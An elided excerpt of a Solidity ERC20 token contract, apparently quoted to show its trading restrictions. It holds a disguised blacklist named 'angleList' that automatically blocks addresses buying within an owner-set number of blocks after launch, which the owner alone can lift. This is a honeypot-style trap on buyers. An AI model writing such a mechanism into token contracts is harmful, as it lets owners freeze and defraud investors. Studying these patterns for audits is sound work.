...
contract BABYTOKEN is ERC20, Ownable {
    ...
    // angleList
    mapping (address => bool) private angleList;
    bool public isKill = true;
    uint256 public killBlock = 0;
    uint256 public lunchedAtBlock = 0;
    ...
    constructor(
        ...
        uint256 tokenBalanceForReward_, //  rewards by limit
        bool isKill_,                // is kill
        uint256 killBlock_   //kill block
    ...
    function setKillStatus(bool killStatus,uint256 newBlock) external onlyOwner{
        isKill = killStatus;
        killBlock = newBlock;
    }
    ...
    function _transfer(
        ...
        require(!angleList[from] && !angleList[to],"Is In BkList");
        if(amount == 0) {
        ...
        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
         ...
         if (lunchedAtBlock == 0) {   
                lunchedAtBlock = block.number;                      
            }
         if (automatedMarketMakerPairs[from]) {
                if (isKill && lunchedAtBlock > 0 && block.number <= (lunchedAtBlock + killBlock)) {
                    addBot(to);
                }
            }
    ...
    function addBot(address recipient) private {
            if (!angleList[recipient]) 
            angleList[recipient] = true;
    }
    function removeBot(address account)  public onlyOwner {
           if (angleList[account]) 
           angleList[account] = false;
    }
